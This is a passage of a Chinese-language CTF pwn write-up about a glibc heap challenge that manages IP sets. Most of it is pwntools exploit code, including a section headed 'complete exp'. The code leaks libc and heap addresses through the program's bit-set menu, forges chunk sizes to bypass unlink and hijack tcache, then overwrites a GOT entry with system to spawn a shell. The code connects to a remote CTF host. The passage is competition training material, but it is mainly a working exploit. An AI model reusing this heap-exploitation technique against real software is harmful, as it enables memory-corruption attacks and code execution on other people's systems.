<span class="k">def</span> <span class="nf">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">ret</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">ip</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="p">(</span><span class="mi">3</span><span class="o">-</span><span class="n">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">255</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="s1">'.'</span>
    <span class="c1"># print(ret)</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">"Choose an option: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">creat</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input start ip:"</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input end ip:"</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="o">+</span><span class="p">((</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">3</span><span class="p">)</span><span class="o">|</span><span class="mi">7</span><span class="p">)))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"==== creat chunk size {hex(size)} ====="</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="nb">str</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input ip: "</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"==== add a ip ====="</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="nb">str</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input ip: "</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"==== delete a ip ====="</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">jude</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input ip:"</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span>
    <span class="c1"># print(f"==== jude a ip =====")</span>
    <span class="n">out</span> <span class="o">=</span> <span class="n">rl</span><span class="p">()</span>
    <span class="c1"># print(out)</span>
    <span class="k">if</span> <span class="n">out</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">"IP is in the set"</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">1</span>
    <span class="k">if</span> <span class="n">out</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">"IP is not in the set"</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"==== free chunk ====="</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_addr</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">off</span><span class="p">,</span><span class="n">value</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">va</span> <span class="o">=</span> <span class="n">value</span>
    <span class="k">while</span> <span class="n">va</span><span class="p">:</span>
        <span class="n">n</span><span class="o">+=</span><span class="mi">1</span>
        <span class="n">va</span> <span class="o">=</span> <span class="n">va</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span> 
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
        <span class="n">bit</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mi">1</span>
        <span class="c1"># print(f"bit:{bit}")</span>
        <span class="k">if</span> <span class="n">bit</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">:</span>
            <span class="n">add</span><span class="p">(</span><span class="n">ip</span><span class="o">+</span><span class="n">off</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span> 
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"set off:{hex(off)} bit:{bit}"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">auto_read</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">off</span><span class="p">,</span><span class="n">value</span><span class="p">,</span><span class="n">chunk_size</span><span class="p">):</span>
    <span class="n">creat</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">chunk_size</span><span class="p">)</span>
    <span class="n">write_addr</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">off</span><span class="p">,</span><span class="n">value</span><span class="p">)</span>

    <span class="c1"># pause()</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\x1B</span><span class="s2">[1;36m==== auto_read finish ====</span><span class="se">\x1B</span><span class="s2">[0m"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_libc</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">off</span><span class="p">):</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">):</span>
        <span class="n">libc</span> <span class="o">+=</span> <span class="n">jude</span><span class="p">(</span><span class="n">ip</span><span class="o">+</span><span class="n">off</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">i</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"get bit {i} :"</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"</span><span class="se">\x1B</span><span class="s2">[1;36m[+]</span><span class="se">\x1B</span><span class="s2">[0m === get inf on chunk off:{hex(off)} ==="</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">libc</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> 
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x430</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">get_libc</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">-</span><span class="mh">0x21ace0</span>
<span class="n">pad</span><span class="p">(</span><span class="s2">"libc"</span><span class="p">,</span><span class="n">libc</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x400</span><span class="p">)</span>

<span class="c1"># #gdb.attach(p,b_string)</span>
<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#链入smallbin 0x30</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x430</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x400</span><span class="p">)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0x30</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="p">)</span>

<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">get_libc</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xbe0</span>
<span class="n">pad</span><span class="p">(</span><span class="s2">"heap"</span><span class="p">,</span><span class="n">heap</span><span class="p">)</span>
<span class="n">pad</span><span class="p">(</span><span class="s2">"libc"</span><span class="p">,</span><span class="n">libc</span><span class="p">)</span>
</pre></div>
<ol>
<li>我们目标是修改size的p位打向上合并劫持tcachbin，这就得free一个chunk进双链表bin才行，所以修改进smalbin的chunksize（chunksize最大为一字节），多次循环让一个smalbin存在8个chunk，拿回来一个剩下的会进入tcachbin，拿回来的chunk修改size的p位（提前伪造好unlink绕过条件），free将会进samllbin，绕过unlink后即可free进入较大的unsortedbin，即可劫持进入tcachbin的chunk。</li>
<li>最后一步通过劫持的tcachbin_chunk修改strok函数内部调用的某个absgot表（知识点<a href="https://xz.aliyun.com/t/16112?time__1311=GuD%3D7KiKBIfD%2FD0lD2jtG8KnqYvtaWxFpD" target="_blank">2024 强网杯-baby_heap - 先知社区</a>有提及）为system，这个得自己调，add函数ip设为“/bin/sh\x00”就通了。</li>
</ol>
<h2 data-content="1" id="3ce51cef4d23559e00976af09f957ea2">完整的exp</h2>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#context(os = 'linux', arch = 'amd64', log_level = 'debug')</span>
<span class="c1"># context(os = 'linux', arch = 'amd64', log_level = 'debug')</span>
<span class="c1">#context.terminal = ['tmux', 'splitw', '-h']</span>

<span class="n">ret_ip_addr</span> <span class="o">=</span> <span class="mh">0x0000000000014B7</span>
<span class="n">b_menu</span> <span class="o">=</span> <span class="mh">0x0000000000001A84</span>
<span class="n">b_add_for</span> <span class="o">=</span> <span class="mh">0x00000000000017DA</span>

<span class="n">file_name</span> <span class="o">=</span> <span class="s1">'./pwn'</span>
<span class="n">b_string</span> <span class="o">=</span><span class="s2">"b main</span><span class="se">\n</span><span class="s2">"</span>
<span class="n">b_slice</span> <span class="o">=</span> <span class="p">[</span><span class="n">b_menu</span><span class="p">]</span>
<span class="n">pie</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">b_slice</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span> <span class="ow">and</span> <span class="n">pie</span><span class="p">:</span>
        <span class="n">b_string</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"b *$rebase({i})</span><span class="se">\n</span><span class="s2">"</span>
    <span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span> <span class="p">:</span>
        <span class="n">b_string</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"b *{hex(i)}</span><span class="se">\n</span><span class="s2">"</span>
    <span class="k">else</span> <span class="p">:</span>
        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span><span class="p">:</span>
            <span class="n">b_string</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"b *"</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">f</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>

<span class="n">choice</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">if</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">:</span>
    <span class="c1"># p = process("nc -X connect -x instance.penguin.0ops.sjtu.cn:18081 2b2he9gw9j6wqj7y 1".split(" "))</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">file_name</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Break_point:</span><span class="se">\n</span><span class="s2">"</span><span class="o">+</span><span class="n">b_string</span><span class="p">)</span>

<span class="k">elif</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span><span class="n">b_string</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Break_point:</span><span class="se">\n</span><span class="s2">"</span><span class="o">+</span><span class="n">b_string</span><span class="p">)</span>

<span class="k">elif</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">:</span>
    <span class="n">ip_add</span> <span class="o">=</span><span class="s2">"nc1.ctfplus.cn"</span>
    <span class="n">port</span> <span class="o">=</span> <span class="mi">39169</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"[==^==] remote : "</span><span class="o">+</span><span class="n">ip_add</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip_add</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>

<span class="c1">#-----------------------------------------------------------------------------------------</span>
<span class="n">rv</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>            <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="o">=</span><span class="bp">False</span>      <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="o">=</span><span class="bp">True</span>     <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>            <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sd</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>            <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>            <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>          <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>         <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">inter</span> <span class="o">=</span> <span class="k">lambda</span>           <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">debug</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="bp">None</span> <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
<span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span><span class="n">addr</span>       <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">addr</span><span class="p">))</span>
<span class="n">pad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>           <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\x1B</span><span class="s2">[1;36m[+]{} =====&gt; 0x</span><span class="si">%x</span><span class="s2"> </span><span class="se">\x1B</span><span class="s2">[0m"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">%</span><span class="n">b</span><span class="p">)</span>
<span class="c1">#-----------------------------------------------------------------------------------------</span>

<span class="k">def</span> <span class="nf">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">ret</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">ip</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="p">(</span><span class="mi">3</span><span class="o">-</span><span class="n">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">255</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="s1">'.'</span>
    <span class="c1"># print(ret)</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">"Choose an option: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">creat</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input start ip:"</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input end ip:"</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="o">+</span><span class="p">((</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">3</span><span class="p">)</span><span class="o">|</span><span class="mi">7</span><span class="p">)))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"==== creat chunk size {hex(size)} ====="</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="nb">str</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input ip: "</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"==== add a ip ====="</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="nb">str</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input ip: "</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"==== delete a ip ====="</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">jude</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">sa</span><span class="p">(</span><span class="s2">"Please input ip:"</span><span class="p">,</span><span class="n">ret2_str_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span>
    <span class="c1"># print(f"==== jude a ip =====")</span>
    <span class="n">out</span> <span class="o">=</span> <span class="n">rl</span><span class="p">()</span>
    <span class="c1"># print(out)</span>
    <span class="k">if</span> <span class="n">out</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">"IP is in the set"</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">1</span>
    <span class="k">if</span> <span class="n">out</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">"IP is not in the set"</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"==== free chunk ====="</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_addr</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">off</span><span class="p">,</span><span class="n">value</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">va</span> <span class="o">=</span> <span class="n">value</span>
    <span class="k">while</span> <span class="n">va</span><span class="p">:</span>
        <span class="n">n</span><span class="o">+=</span><span class="mi">1</span>
        <span class="n">va</span> <span class="o">=</span> <span class="n">va</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span> 
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
        <span class="n">bit</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mi">1</span>
        <span class="c1"># print(f"bit:{bit}")</span>
        <span class="k">if</span> <span class="n">bit</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">:</span>
            <span class="n">add</span><span class="p">(</span><span class="n">ip</span><span class="o">+</span><span class="n">off</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span> 
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"set off:{hex(off)} bit:{bit}"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">auto_read</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">off</span><span class="p">,</span><span class="n">value</span><span class="p">,</span><span class="n">chunk_size</span><span class="p">):</span>
    <span class="n">creat</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">chunk_size</span><span class="p">)</span>
    <span class="n">write_addr</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">off</span><span class="p">,</span><span class="n">value</span><span class="p">)</span>

    <span class="c1"># pause()</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\x1B</span><span class="s2">[1;36m==== auto_read finish ====</span><span class="se">\x1B</span><span class="s2">[0m"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_libc</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">off</span><span class="p">):</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">):</span>
        <span class="n">libc</span> <span class="o">+=</span> <span class="n">jude</span><span class="p">(</span><span class="n">ip</span><span class="o">+</span><span class="n">off</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">i</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"get bit {i} :"</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"</span><span class="se">\x1B</span><span class="s2">[1;36m[+]</span><span class="se">\x1B</span><span class="s2">[0m === get inf on chunk off:{hex(off)} ==="</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">libc</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> 
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x430</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">get_libc</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">-</span><span class="mh">0x21ace0</span>
<span class="n">pad</span><span class="p">(</span><span class="s2">"libc"</span><span class="p">,</span><span class="n">libc</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x400</span><span class="p">)</span>

<span class="c1"># #gdb.attach(p,b_string)</span>
<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#链入smallbin 0x30</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x430</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x400</span><span class="p">)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0x30</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="p">)</span>

<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">get_libc</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xbe0</span>
